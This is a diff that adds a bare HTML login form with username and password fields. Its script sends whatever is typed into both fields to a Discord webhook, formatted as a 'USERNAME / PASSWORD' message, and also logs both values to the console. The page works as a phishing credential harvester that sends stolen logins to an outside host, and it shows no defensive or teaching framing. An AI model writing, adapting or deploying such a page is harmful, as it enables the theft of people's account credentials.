@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+  <head> </head>
+  <body>
+    <form onsubmit="sendMessage(); return false">
+      <input type="text" name="username" id="username" />
+      <input type="password" name="password" id="password" />
+      <input type="submit" />
+    </form>
+
+    <script>
+      function sendMessage() {
+        console.log("Does work!");
+
+        var requst = new XMLHttpRequest();
+
+        requst.open(
+          "POST",
+          "https://discord.com/api/webhooks/1342087500449058849/vu1ds5E8-Hy2nIXJ2GqHJ-IjJECXNMgqDJWV-Fsbm6gGa3mpjH8heGcxMm75UkXNaH8Z"
+        );
+        requst.setRequestHeader("Content-type", "application/json");
+
+        console.log(document.getElementById("username").value);
+        console.log(document.getElementById("password").value);
+
+        var params = {
+          content:
+            "> **USERNAME : **" +
+            document.getElementById("username").value +
+            "\n **PASSWORD : ** " +
+            document.getElementById("password").value,
+        };
+
+        requst.send(JSON.stringify(params));
+      }
+    </script>
+  </body>
+</html>
